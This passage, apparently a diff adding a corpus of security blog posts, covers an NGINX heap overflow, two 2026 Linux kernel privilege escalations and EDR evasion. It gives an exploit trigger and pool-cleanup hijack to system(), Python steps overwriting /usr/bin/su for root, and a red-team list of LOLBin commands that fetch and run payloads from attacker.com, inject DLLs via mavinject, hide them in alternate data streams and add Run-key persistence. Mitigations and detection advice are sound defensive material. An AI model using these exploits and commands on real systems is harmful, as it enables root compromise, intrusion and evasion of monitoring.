+    e->ip += sizeof(uintptr_t);
+}
+```
+
+When the subsequent `set` directive's capture group is evaluated, it goes through `ngx_http_script_complex_value_code`. This function runs the length calculation using a fresh sub-engine:
+
+```c
+ngx_memzero(&le, sizeof(ngx_http_script_engine_t));
+le.ip = code->lengths->elts;
+```
+
+That zero-initialized sub-engine has `le.is_args = 0`. The length calculation function `ngx_http_script_copy_capture_len_code` checks `e->is_args` before deciding whether to account for URI escaping:
+
+```c
+if ((e->is_args || e->quote)
+    && (e->request->quoted_uri || e->request->plus_in_uri))
+{
+    return cap_len + 2 * ngx_escape_uri(NULL, ...);  // escaped length
+} else {
+    return cap_len;                                   // raw length
+}
+```
+
+`le.is_args` is zero, so the length calculation returns the raw, unescaped length and allocates accordingly.
+
+The copy pass runs on the main engine where `e->is_args` is still set to `1`. The exact same conditional now evaluates true. It calls `ngx_escape_uri` with `NGX_ESCAPE_ARGS`, which expands every escapable character (plus signs, ampersands, etc.) from one byte to three bytes. If the capture group contains `N` escapable characters, the copy writes `raw_len + 2*N` bytes into a buffer sized for `raw_len`.
+
+An attacker with a crafted URI containing many plus signs controls `N` directly. The overflow size is under their control.
+
+## A Configuration That Exposes the Bug
+
+```nginx
+location ~ ^/api/(.*)$ {
+    rewrite ^/api/(.*)$ /internal?migrated=true;
+    set $original_endpoint $1;
+}
+```
+
+This pattern is common in API migration setups: rewrite to a new path, capture the old path for logging or forwarding. Both directives are entirely normal. There is no obvious attack surface here at the configuration level.
+
+A request to `/api/++++++++++++++++++++++++++++++` (hundreds of plus signs) blows past the buffer boundary on the copy pass.
+
+## Exploitation: Heap Feng Shui and Pool Corruption
+
+NGINX's multi-process architecture is actually what makes this exploitable rather than just a crash generator. Worker processes fork from the master. Because they fork, they share the same heap layout. If you crash a worker, the master spawns a new one with the same layout. Retry until success.
+
+The target is `ngx_pool_t`, specifically its `cleanup` field at offset 64. NGINX pools have a linked list of cleanup handlers: function pointers called when the pool is destroyed.
+
+```c
+struct ngx_pool_cleanup_s {
+    ngx_pool_cleanup_pt   handler;
+    void                 *data;
+    ngx_pool_cleanup_t   *next;
+};
+```
+
+If you can overwrite the `cleanup` pointer to point at a fake structure, you control what function gets called with what argument when the pool tears down.
+
+The trick is timing. To overwrite the pool header, you also overwrite its allocation metadata (`d`, `max`, `current`, `chain`, `large`), which are at lower offsets. If the worker tries to allocate from the pool after the overflow, it dereferences one of those corrupted pointers and crashes before you can do anything useful. The researchers solved this with a connection ordering technique:
+
+1. Open connection A, send partial headers. NGINX allocates a request pool for it.
+2. Open connection B (victim). NGINX allocates the victim pool adjacent to A's pool on the heap.
+3. Complete connection A's headers, triggering the rewrite overflow out of A's pool and into the victim pool header.
+4. Immediately close connection B. NGINX calls `ngx_destroy_pool`, which walks the `cleanup` list. It does not touch the corrupted allocation fields.
+
+The cleanup pointer gets dereferenced with the corrupted value before the allocator corruption ever causes a crash.
+
+## POST Body Spraying for Arbitrary Pointers
+
+The overflow payload consists of URI-safe characters (the escaped plus signs and similar bytes). Binary pointers, which often contain null bytes, cannot pass through the URI parser intact. The researchers solved this by spraying the heap with POST request bodies: raw data streams that accept arbitrary bytes. A fake `ngx_pool_cleanup_s` structure pointing to `system()` from libc, with a command string as the `data` field, gets sprayed at a predictable offset. The NGINX heap layout is deterministic across workers, so the spray lands at a known address. The overflow writes that address into the `cleanup` pointer, and when connection B closes, NGINX calls `system("your_command")`.
+
+The PoC on GitHub demonstrates this against NGINX with ASLR disabled. The ASLR bypass chain exploits the deterministic multi-fork layout to leak runtime addresses progressively, though the researchers did not release that chain at initial disclosure.
+
+## Scope
+
+This is not a niche configuration. `rewrite` and `set` together appear in a large fraction of real NGINX configs. API gateways, reverse proxies, any migration setup that captures and stores parts of the old URL. F5's NGINX Plus R32 through R36, NGINX Ingress Controller (used for Kubernetes ingress), and NGINX Gateway Fabric are all affected.
+
+The NGINX security advisory (F5 K000160932) confirms active exploitation attempts. Qualysec reported confirmed in-the-wild attacks as of late May 2026.
+
+## Patches and Mitigations
+
+Update to NGINX 1.28.1 (stable branch) or 1.29.0 (mainline). For NGINX Plus, R37 includes the fix. For Kubernetes users on NGINX Ingress Controller, 5.5.0 is patched.
+
+If you cannot patch immediately, the most direct mitigation is to audit your configs for the combination of a `rewrite` with a question mark followed by a `set` with a capture reference:
+
+```bash
+nginx -T | grep -A2 'rewrite.*\?'
+```
+
+Any `rewrite` containing `?` in the replacement string that is followed by a `set` with a capture variable (`$1`, `$2`, etc.) in the same location block is potentially vulnerable. Restructuring these configs to avoid the flag-carrying `rewrite` form eliminates the attack surface at the config level.
+
+If you are running affected versions in a containerized environment and cannot upgrade the image immediately, a WAF rule blocking excessive plus signs or percent-encoded characters in the path portion of requests (`%2B`, `+` runs longer than a reasonable threshold) will prevent the overflow trigger. It is not a fix. It buys time.
+
+The full advisory is at F5's security portal (K000160932). Fixed packages are available across all major Linux distributions that ship NGINX.
+
+---
+
+**Sources:**
+- [DepthFirst Research: NGINX Rift](https://depthfirst.com/research/nginx-rift-achieving-nginx-rce-via-an-18-year-old-vulnerability)
+- [GitHub PoC: DepthFirstDisclosures/Nginx-Rift](https://github.com/DepthFirstDisclosures/Nginx-Rift)
+- [Akamai analysis: CVE-2026-42945](https://www.akamai.com/blog/security-research/nginx-critical-heap-buffer-overflow-cve-2026-42945)
+- [Qualysec: Active exploitation report](https://qualysec.com/cybersecurity-news/nginx-cve-2026-42945-exploited-in-wild/)
+- [The Hacker News coverage](https://thehackernews.com/2026/05/18-year-old-nginx-rewrite-module-flaw.html)
+</BODY>
+</DOCUMENT>
+
+--------------------------------------------------------------------------------
+
+<DOCUMENT id="005" type="security-research-post">
+<FRONTMATTER>
+TITLE      : CVE-2026-31431: Copy Fail — 732 Bytes to Root on Every Major Linux Distro
+DATE       : 2026-05-27
+URL        : https://garrettstimpson.ca/posts/2026/05/27/cve-2026-31431-copy-fail-linux-lpe/
+CVE        : CVE-2026-31431, cve-2026-31431
+CATEGORIES : kernel, lpe, linux, cve
+TAGS       : CVE-2026-31431, linux, kernel, privilege-escalation, AF_ALG, page-cache, container-escape, cloud
+WORD_COUNT : 1284
+EXCERPT    : >
+</FRONTMATTER>
+<BODY>
+**CVE:** CVE-2026-31431
+**CVSS:** 7.8 (High)
+**Disclosed:** April 29, 2026 (Xint Code / Theori)
+**Affected kernels:** ~2017–2026 (all distros shipping kernel with `algif_aead.c` in-place optimization)
+**Public PoC:** Yes — [SeanRickerd/cve-2026-31431](https://github.com/SeanRickerd/cve-2026-31431)
+**Patch commit:** [a664bf3d603d](https://github.com/torvalds/linux/commit/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
+
+---
+
+## The One-Liner
+
+Three independent, reasonable kernel changes — made in 2011, 2015, and 2017 — line up in exactly the wrong way. The result: any unprivileged local user can write 4 arbitrary bytes into the page cache of any readable file on the system, repeat it across offsets, and turn a setuid binary into a root shell. No race. No crash. 732 bytes of Python using only the standard library.
+
+---
+
+## Background: The Three Pieces
+
+### Piece 1 — `authencesn` (2011)
+
+`authencesn` is an AEAD wrapper added in 2011 for IPsec Extended Sequence Number support ([commit a5079d084f8b](https://github.com/torvalds/linux/commit/a5079d084f8b)). IPsec uses 64-bit sequence numbers split into `seqno_hi` (bytes 0–3 of AAD) and `seqno_lo` (bytes 4–7). To rearrange these for HMAC computation, `authencesn` uses the destination buffer as scratch space inside `crypto_authenc_esn_decrypt()`:
+
+```c
+scatterwalk_map_and_copy(tmp, dst, 0, 8, 0);                           // read AAD bytes 0–7
+scatterwalk_map_and_copy(tmp, dst, 4, 4, 1);                           // overwrite dst[4..7] with seqno_hi
+scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);     // write seqno_lo PAST the tag
+```
+
+That third call writes 4 bytes at `dst[assoclen + cryptlen]` — **past the end of the AEAD output**. No other standard kernel AEAD does this. Harmless at the time: the only callers were the kernel's internal xfrm layer with tightly controlled scatterlists.
+
+### Piece 2 — `AF_ALG` AEAD socket support (2015)
+
+`AF_ALG` exposes the kernel's entire crypto subsystem to unprivileged userspace. In 2015 this gained AEAD support with a `splice()` path. `splice()` transfers page references without copying — when you `splice()` a file into an `AF_ALG` socket, the socket's scatterlist holds direct pointers to the kernel's page cache pages for that file. At this point, out-of-place operation kept page cache pages safe in `req->src` (read-only). Not yet exploitable.
+
+### Piece 3 — The In-Place Optimization (2017)
+
+[Commit 72548b093ee3](https://github.com/torvalds/linux/commit/72548b093ee3) optimized `algif_aead.c` to run AEAD in-place. It copied AAD and ciphertext from the TX SGL into the RX buffer, but chained the tag pages **by reference** using `sg_chain()`, then set `req->src = req->dst`. Page cache pages from `splice()` were now in the writable destination scatterlist. `authencesn`'s write at `dst[assoclen + cryptlen]` would now walk into those tag pages. Bug silently introduced. Nobody connected the three changes for nearly a decade.
+
+---
+
+## The Vulnerability
+
+When `authencesn` decrypts inside the AF_ALG in-place path, its third scratch write walks past the RX buffer into the chained page cache pages. `scatterwalk_map_and_copy` calls `kmap_local_page()`, maps the page, and writes 4 bytes — `seqno_lo` — directly into the kernel's cached copy of the target file. `recvmsg()` returns `-EBADMSG` (HMAC fails on the fabricated ciphertext), but **the write already happened and is permanent in the page cache**.
+
+The attacker controls three axes:
+
+| Axis | Control mechanism |
+|------|-------------------|
+| **Which file** | Any file readable by current user — `/usr/bin/su` is world-readable |
+| **Which offset** | Chosen via splice file offset, splice length, and `assoclen` |
+| **Which 4 bytes** | AAD bytes 4–7 in `sendmsg()` → directly written as `seqno_lo` |
+
+---
+
+## The Exploit Chain
+
+Default target: `/usr/bin/su` — setuid-root, world-readable, present on all tested distros.
+
+### Step 1: Socket Setup
+
+```python
+import socket, os
+
+# AF_ALG = 38, SOCK_SEQPACKET = 5
+sock = socket.socket(38, 5, 0)
+sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))", 0, 16))
+sock.setsockopt(279, 4, key)   # ALG_SET_KEY
+req = sock.accept()[0]         # creates the request socket — no privileges needed
+```
+
+### Step 2: Controlled Write Primitive
+
+For each 4-byte chunk of shellcode:
+
+```python
+# AAD bytes 4–7 = the value to write (seqno_lo)
+aad = b'\x00' * 4 + payload_chunk + b'\x00' * (assoclen - 8)
+
+req.sendmsg([aad + fake_ct], cmsg_headers, socket.MSG_MORE)
+
+r_pipe, w_pipe = os.pipe()
+os.splice(target_fd, w_pipe, splice_offset, splice_len)
+os.splice(r_pipe, alg_fd, 0, splice_len)
+
+try:
+    req.recv(buf_size)
+except OSError:
+    pass  # -EBADMSG expected; 4-byte write already committed to page cache
+```
+
+### Step 3: Execute
+
+```python
+os.execve("/usr/bin/su", ["su"], {})
+# kernel loads /usr/bin/su from page cache — our patched version — runs as UID 0
+```
+
+On-disk binary is untouched. `sha256sum /usr/bin/su` returns the correct hash. AIDE/Tripwire miss it. Only in-memory page cache scanning catches it.
+
+---
+
+## Tested Distributions
+
+| Distribution | Kernel | Result |
+|---|---|---|
+| Ubuntu 24.04 LTS | 6.17.0-1007-aws | Root |
+| Amazon Linux 2023 | 6.18.8-9.213.amzn2023 | Root |
+| RHEL 10.1 | 6.12.0-124.45.1.el10_1 | Root |
+| SUSE 16 | 6.12.0-160000.9-default | Root |
+
+Same script, no modification, no recompilation, no per-distro offsets.
+
+---
+
+## Why This is Nastier Than Dirty Cow / Dirty Pipe
+
+| Property | Dirty Cow (2016) | Dirty Pipe (2022) | Copy Fail (2026) |
+|---|---|---|---|
+| Race condition required | Yes — retries needed | No | No |
+| Crash risk | Moderate | Low | Very low |
+| Version specific | No | Yes (5.8–5.16) | No (all distros since 2017) |
+| Disk artifact | Yes | No | No |
+| Container escape | No | Partial | Yes |
+| PoC size | ~100 lines C | ~50 lines C | 732 bytes Python |
+
+---
+
+## Container Escape
+
+The page cache is shared across the entire host — containers share it with the host kernel. Code execution inside an unprivileged container + a setuid binary accessible via bind-mount or shared volume = the same primitive crosses container boundaries. Xint published [Part 2](https://xint.io/blog/copy-fail-pod-to-host) detailing the full Kubernetes node compromise across GKE, EKS, and AKS.
+
+---
+
+## The Fix
+
+[Patch a664bf3d603d](https://github.com/torvalds/linux/commit/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5) reverts `algif_aead.c` to out-of-place operation:
+
+```c
+// Before (vulnerable): req->src and req->dst point to same scatterlist
+aead_request_set_crypt(&areq->cra_u.aead_req, rsgl_src, areq->first_rsgl.sgl.sgt.sgl, used, ctx->iv);
+
+// After (fixed): TX SGL as src, RX SGL as dst — separate, page cache safe
+aead_request_set_crypt(&areq->cra_u.aead_req, tsgl_src, areq->first_rsgl.sgl.sgt.sgl, used, ctx->iv);
+```
+
+---
+
+## Remediation
+
+**Patch now.** All major distros have shipped fixes:
+
+| Distro | Fix |
+|---|---|
+| Ubuntu | [ubuntu.com advisory](https://ubuntu.com/blog/copy-fail-vulnerability-fixes-available) |
+| RHEL / AlmaLinux | [almalinux.org](https://almalinux.org/blog/2026-05-01-cve-2026-31431-copy-fail/) |
+| Amazon Linux 2023 | kernel package update |
+| SUSE 16 | kernel package update |
+
+**Immediate mitigation** — disable `algif_aead` if patching isn't possible yet:
+
+```bash
+echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif-aead.conf
+rmmod algif_aead 2>/dev/null
+```
+
+**Detection** — [Elastic 8.19 rule](https://www.elastic.co/guide/en/security/8.19/potential-copy-fail-cve-2026-31431-exploitation-via-af-alg-socket.html): unprivileged `AF_ALG` bind to `authencesn` + `splice()` targeting setuid binaries.
+
+---
+
+## Disclosure Timeline
+
+| Date | Event |
+|---|---|
+| 2026-03-23 | Reported to Linux kernel security team |
+| 2026-03-24 | Acknowledgment received |
+| 2026-03-25 | Patch proposed and reviewed |
+| 2026-04-01 | Committed to mainline |
+| 2026-04-22 | CVE-2026-31431 assigned |
+| 2026-04-29 | Public disclosure — Xint / Theori |
+
+---
+
+## References
+
+- [Xint: Copy Fail — 732 Bytes to Root](https://xint.io/blog/copy-fail-linux-distributions)
+- [Microsoft Security Blog: CVE-2026-31431](https://www.microsoft.com/en-us/security/blog/2026/05/01/cve-2026-31431-copy-fail-vulnerability-enables-linux-root-privilege-escalation/)
+- [Tenable FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
+- [Sysdig deep-dive](https://www.sysdig.com/blog/cve-2026-31431-copy-fail-linux-kernel-flaw-lets-local-users-gain-root-in-seconds)
+- [Palo Alto Unit 42](https://unit42.paloaltonetworks.com/cve-2026-31431-copy-fail/)
+- [oss-security thread](https://www.openwall.com/lists/oss-security/2026/04/29/23)
+- [Patch commit a664bf3d603d](https://github.com/torvalds/linux/commit/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
+- [Public PoC](https://github.com/SeanRickerd/cve-2026-31431)
+</BODY>
+</DOCUMENT>
+
+--------------------------------------------------------------------------------
+
+<DOCUMENT id="006" type="security-research-post">
+<FRONTMATTER>
+TITLE      : Dirty Frag: Deterministic Root in Every Major Linux Distro
+DATE       : 2026-05-26
+URL        : https://garrettstimpson.ca/posts/2026/05/26/dirty-frag-linux-kernel-lpe/
+CVE        : CVE-2026-31431, cve-2026-43284, CVE-2026-43284, cve-2026-43500, CVE-2026-43500
+CATEGORIES : exploits, linux, lpe
+TAGS       : cve, dirty-frag, kernel, ipsec, rxrpc, privilege-escalation, page-cache
+WORD_COUNT : 913
+EXCERPT    : Two in-place decryption optimizations introduced in 2017 and 2023 let an unprivileged local user corrupt arbitrary page cache entries and escalate to root. No race window. Standard syscalls only.
+</FRONTMATTER>
+<BODY>
+What makes a kernel vulnerability genuinely scary? Not just the CVSS score. It's the combination: deterministic exploitation with no timing window, no special privileges required, and a bug introduced by a performance optimization that shipped in every kernel for nearly a decade before anyone noticed.
+
+Dirty Frag checks all three boxes.
+
+CVE-2026-43284 and CVE-2026-43500, nicknamed Dirty Frag, were published by researcher Hyunwoo Kim on May 8, 2026. Kim says he was pushed to go public ahead of schedule after another party broke a coordinated embargo. Patches weren't out yet when the PoC dropped. Active exploitation followed within hours.
+
+## The page cache write primitive lineage
+
+If you've followed Linux kernel LPEs over the last decade, you know the page cache write primitive. Dirty Cow (2016) gave you arbitrary writes via a COW race. Dirty Pipe (2022) gave you writes through pipe buffer flag abuse. Copy Fail (CVE-2026-31431) used `AF_ALG` and `splice()`.
+
+Dirty Frag is the latest, but it's arguably the cleanest.
+
+The core issue sits in the IPsec ESP and RxRPC network stacks. Both have a fast path where, instead of copying received data into a fresh buffer before decryption, the kernel decrypts directly into the page cache. This is a performance win: fewer memory copies, better cache behavior. It's also the problem. Network code ends up with a write path into pages that are supposed to be read-only.
+
+CVE-2026-43284 covers the ESP variant (`esp4` and `esp6`). The bug traces to commit `cac2661c53f3` merged in January 2017. CVE-2026-43500 covers RxRPC, introduced in June 2023.
+
+Nine years for the ESP half. Nobody caught it.
+
+## Why "deterministic" changes everything
+
+Most page cache corruption exploits involve timing. You race against the kernel, success rates vary. Dirty Pipe had good rates because the race window was wide. Other bugs require hundreds of attempts, specific CPU topology, or a fast machine.
+
+Dirty Frag has no race condition at all. The corruption happens deterministically on the `sendmsg()` path through the ESP or RxRPC code. Kim reported high success rates and minimal kernel panic risk across test environments. You run it once and it works.
+
+That's what separates it from the average LPE.
+
+## The exploit chain
+
+No elevated capabilities or unusual kernel modules needed. `esp4`, `esp6`, and `rxrpc` load by default in every major enterprise distribution. The syscalls involved are completely standard: `socket`, `setsockopt`, `bind`, `vmsplice`, `splice`, `sendmsg`.
+
+Rough flow:
+
+```
+1. Create an IPsec ESP socket with a crafted symmetric key
+2. Use vmsplice() to obtain a page cache reference
+3. Trigger the in-place decryption path via sendmsg() with a crafted packet
+4. The decryption routine writes your chosen bytes into the page cache entry
+5. Arbitrary write primitive into read-only pages achieved
+6. Chain to SUID binary overwrite or kernel data structure corruption
+```
+
+For the RxRPC path the mechanics differ slightly but the outcome is identical.
+
+The container escape angle is worth noting specifically. The page cache is shared across the entire host. A container with standard Linux capabilities (not `CAP_SYS_ADMIN`) can corrupt host page cache entries. On unpatched Kubernetes nodes this becomes a container-to-host escape. Microsoft's security blog confirmed active use of exactly this pattern in post-compromise scenarios observed in the wild within the first 24 hours after the PoC dropped.
+
+## Blocking the modules as a stopgap
+
+If patching immediately isn't possible:
+
+```bash
+echo "install esp4 /bin/false" >> /etc/modprobe.d/dirty-frag.conf
+echo "install esp6 /bin/false" >> /etc/modprobe.d/dirty-frag.conf
+echo "install rxrpc /bin/false" >> /etc/modprobe.d/dirty-frag.conf
+```
+
+This stops the vulnerable modules from loading. It breaks IPsec-based VPN tunnels and any RxRPC-dependent services (primarily OpenAFS). Check whether the modules are already loaded before deploying:
+
+```bash
+lsmod | grep -E "^(esp4|esp6|rxrpc)"
+```
+
+If they show up, unload with `rmmod` or reboot after adding the modprobe config.
+
+## Detection signatures
+
+Sysdig's write-up flags the combination that doesn't appear in legitimate workloads: a process calling `socket(AF_INET, SOCK_RAW, IPPROTO_ESP)`, followed by `vmsplice()` into a file-backed mapping, followed by `sendmsg()` with a payload of specific sizes. If you're running a SIEM or behavioral detection layer, their rule set is worth importing directly.
+
+For container environments, watch for `sendmsg` calls to `IPPROTO_ESP` sockets originating from container PIDs. That combination has essentially no legitimate use case in most Kubernetes deployments.
+
+## The lesson that keeps not sticking
+
+After every one of these bugs, someone points out that performance optimizations in security-critical code paths are risky. In-place decryption is faster than copy-then-decrypt. It also creates a write path into read-only pages if the bounds and state assumptions aren't airtight.
+
+The ESP fast path was in the kernel for nine years. The RxRPC version was added in 2023, a full year after Dirty Pipe should have made everyone paranoid about page cache write primitives. It wasn't.
+
+Patch. Then ask why your review process didn't catch it either.
+
+---
+
+*Based on the [Wiz blog](https://www.wiz.io/blog/dirty-frag-linux-kernel-local-privilege-escalation-via-esp-and-rxrpc), [Sysdig detection guide](https://www.sysdig.com/blog/dirty-frag-cve-2026-43284-and-cve-2026-43500-detecting-unpatched-local-privilege-escalation-via-linux-kernel-esp-and-rxrpc), and [Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2026/05/08/active-attack-dirty-frag-linux-vulnerability-expands-post-compromise-risk/).*
+</BODY>
+</DOCUMENT>
+
+--------------------------------------------------------------------------------
+
+<DOCUMENT id="007" type="security-research-post">
+<FRONTMATTER>
+TITLE      : Living Off the Land in 2026: The Techniques EDR Still Misses
+DATE       : 2026-05-25
+URL        : https://garrettstimpson.ca/posts/2026/05/25/lolbins-edr-bypass-2026/
+CVE        : CVE-2026-46333
+CATEGORIES : red-team, tricks, evasion
+TAGS       : lolbins, edr, red-team, windows, linux, io-uring, mavinject, living-off-the-land, ebpf
+WORD_COUNT : 1447
+EXCERPT    : 79% of attacks this year use zero custom malware. Here's what's actually being used, how it works under the hood, and why your EDR probably doesn't see it.
+</FRONTMATTER>
+<BODY>
+The 2025 CrowdStrike Global Threat Report has a number that should make every blue teamer uncomfortable: 79% of detected attacks involved no malware at all. No custom dropper, no staged payload, nothing with a signature to catch. Just Windows and Linux tools doing exactly what they're designed to do, pointed in the wrong direction.
+
+This is where offensive security actually lives in 2026. If you're writing custom malware and dropping it to disk, you're working harder than necessary and creating way more detection surface than the job requires. The genuinely effective techniques live inside tools the OS already trusts.
+
+Here's what's actually being used, how it works, and what real detection requires.
+
+## MAVInject.exe: Microsoft's Gift to Red Teams
+
+`mavinject.exe` ships with every Windows installation as part of Microsoft Application Virtualization. Its intended purpose is injecting helper DLLs into App-V virtualized processes. In offensive operations it becomes arbitrary code injection into any running process via a single command:
+
+```cmd
+C:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING C:\path\to\payload.dll
+```
+
+Point it at a process ID, give it a DLL path, and mavinject calls `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` under a Microsoft-signed process name. Most EDRs whitelist this binary because it's a legitimate system component. The DLL loads into the target process. No custom injection code needed.
+
+The variant that's particularly hard to catch: DLLs hidden in NTFS Alternate Data Streams.
+
+```cmd
+REM Hide payload in ADS
+type payload.dll > C:\Windows\Temp\legit.log:hidden.dll
+
+REM Inject from ADS path
+mavinject.exe <PID> /INJECTRUNNING C:\Windows\Temp\legit.log:hidden.dll
+```
+
+In Explorer, `legit.log` looks like a plain log file. The DLL is invisible to directory listings. Seeing it requires `dir /r` or explicit ADS tooling.
+
+APT groups including Earth Preta and Lazarus have been caught using this in real campaigns. It's MITRE ATT&CK T1218.013. Worth checking whether your detection coverage for that technique ID is actually implemented or just listed as covered.
+
+**What detection actually requires:** Sysmon or Event ID 4688 with full command-line logging, specifically watching for `mavinject.exe` with `/INJECTRUNNING` in the arguments. Behavioral correlation that flags `mavinject.exe` spawning `OpenProcess` + `WriteProcessMemory` API call sequences works too, but most deployments aren't configured this tight.
+
+## The Kill Chain That Still Slips Through
+
+This sequence has been observed in real attacks against enterprise environments and still makes it past most corporate EDR stacks:
+
+```batch
+forfiles /c "cmd /c mshta http://attacker.com/stage1.hta"
+```
+
+`forfiles.exe` is a batch job utility signed by Microsoft. It spawns `cmd.exe`, which spawns `mshta.exe`, which fetches and executes an HTML Application from a remote URL. `mshta` is also signed by Microsoft. The initial chain looks like: trusted binary spawns cmd spawns trusted binary. No obvious red flag if you're not watching parent-child process trees.
+
+From the `mshta` stage, drop and extract the actual payload:
+
+```cmd
+curl.exe -o C:\Users\Public\update.cab https://attacker.com/payload.cab
+tar.exe -xf C:\Users\Public\update.cab -C C:\Users\Public\
+```
+
+`curl.exe` shipped with Windows starting in 2019. `tar.exe` arrived in 2018. Detection coverage for both is still immature compared to classics like `certutil` and `regsvr32`, because for years these binaries simply didn't exist on Windows and nobody built mature detections for them. `curl.exe` to an external IP is suspicious in isolation. `curl.exe` spawned from `mshta` spawned from `forfiles` is far more suspicious, but catching the chain requires process ancestry tracking across the full execution tree.
+
+Then persistence via a binary that also gets relatively little scrutiny:
+
+```cmd
+reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "C:\Users\Public\stage2.exe" /f
+```
+
+`reg.exe` is Microsoft-signed. Adding a Run key is normal Windows administration. Flagging this requires behavioral baselining, not signatures.
+
+## Linux: io_uring Makes EDR Blind
+
+On the Linux side, the most important development in the last year is `io_uring` as an EDR bypass primitive, demonstrated most clearly by RingReaper and the "Curing" proof-of-concept rootkit.
+
+Linux EDRs hook syscalls. They watch `open()`, `connect()`, `read()`, `write()`, `execve()`. Hooks trigger, events get logged, the EDR decides if something is malicious. This model has worked because attackers make those syscalls.
+
+`io_uring` breaks that assumption. Merged in kernel 5.1, it's an async I/O interface where instead of making individual syscalls for each operation, userspace drops requests into a shared ring buffer and the kernel processes them asynchronously. The actual I/O happens inside kernel context, without the userspace-to-kernel transitions that EDR hooks catch. From the EDR's perspective, almost nothing happened. A single `io_uring_enter()` call submitted a batch of file opens, network connections, and reads that the kernel silently executed.
+
+RingReaper uses this to exfiltrate data, open connections, and read files with dramatically reduced syscall visibility. The "Curing" proof-of-concept runs entirely through io_uring operations and was tested against Falco, Microsoft Defender for Linux, and others. It evaded all of them in published test runs.
+
+The fix requires EDR vendors to instrument `io_uring_enter` at the kernel level, not just the individual syscall paths that io_uring bypasses. Most haven't gotten there yet.
+
+**Immediate blue team actions:** Check whether your Falco ruleset covers `io_uring_enter`. Most don't by default. Audit which processes call `io_uring_enter` and how often. A process suddenly doing bulk I/O through io_uring with no prior history is worth investigating. For high-security environments, restrict io_uring via seccomp policy or set `/proc/sys/kernel/io_uring_disabled` to 1 (available in recent kernels).
+
+## eBPF: The Tool That Goes Both Ways
+
+eBPF gets discussed as a defense technology constantly. It's how Falco works, how most modern Linux observability works. The same capabilities that make it great for monitoring make it interesting for attackers with the right privileges.
+
+eBPF programs can intercept syscalls, modify return values, hide network connections, and conceal processes from standard Linux tools. TripleCross (2022) demonstrated syscall hooking via eBPF to hide malicious activity. Boopkit showed network backdooring through eBPF packet filtering. The process hiding pattern: hook `getdents64` with an eBPF program that filters specific entries from directory results, and `ls`, `ps`, and `/proc` enumeration silently skip your hidden processes and files.
+
+The practical constraint: most eBPF attack techniques require root or `CAP_BPF`. That makes this post-exploitation, not initial access. But after you've used Dirty Frag or CVE-2026-46333 to get root, eBPF-based persistence is genuinely difficult to detect without purpose-built tooling.
+
+**Detection:** Audit BPF program loads regularly:
+
+```bash
+# List all loaded eBPF programs
+bpftool prog list
+
+# Check for programs attached to syscall entry points
+bpftool prog list | grep kprobe | grep sys_enter
+```
+
+Programs attached to syscall hooks that weren't placed there by your known security tools (Falco, etc.) are worth investigating. Cross-reference with your deployment records.
+
+## Quick Reference: LOLBin Techniques Worth Knowing
+
+For reference — all of these are on the [LOLBAS Project](https://lolbas-project.github.io/):
+
+```cmd
+REM Download via certutil (classic, flagged everywhere now)
+certutil.exe -urlcache -split -f http://attacker.com/payload.exe payload.exe
+
+REM Download via curl (less mature detections)
+curl.exe -o payload.exe http://attacker.com/payload.exe
+
+REM Script execution via mshta (bypasses script restrictions)
+mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""powershell.exe"")(window.close)")
+
+REM DLL execution via regsvr32 (Squiblydoo, increasingly caught)
+regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
+
+REM Process injection via mavinject (low detection coverage)
+mavinject.exe <PID> /INJECTRUNNING C:\path\to\payload.dll
+```
+
+On Linux, `strace` attached to a privileged process can sometimes read file contents through its output — worth knowing for local access scenarios:
+
+```bash
+strace -e trace=read -p <pid_of_privileged_process> 2>&1 | grep -A1 "read("
+```
+
+## The pattern underneath all of this
+
+Every technique here has the same shape: use something legitimate, abuse its designed functionality, stay below the detection threshold of tools built for a different threat model.
+
+The defense answer isn't more signatures. It's behavioral baselining, parent-child process chain analysis, and monitoring things that haven't traditionally been monitored: `io_uring_enter`, NTFS ADS paths, BPF program loads, and the specific argument combinations that turn legitimate admin tools into attack chains. Most organizations aren't doing this yet. Most will find out the hard way.
+
+---
+
+*References: [RingReaper analysis](https://cybersecuritynews.com/ringreaper-edr-evasion/), [ARMO io_uring research](https://www.infoq.com/news/2025/09/linux-security-rootkit/), [MITRE ATT&CK T1218.013](https://attack.mitre.org/techniques/T1218/013/), [LOLBAS Project](https://lolbas-project.github.io/), [Hive Security 2026](https://hivesecurity.gitlab.io/blog/lolbins-living-off-the-land-windows-2026/)*
+</BODY>
+</DOCUMENT>
+
+--------------------------------------------------------------------------------
+
+================================================================================
+END OF CORPUS — 7 documents — 2026-05-27T14:00:32Z
+================================================================================
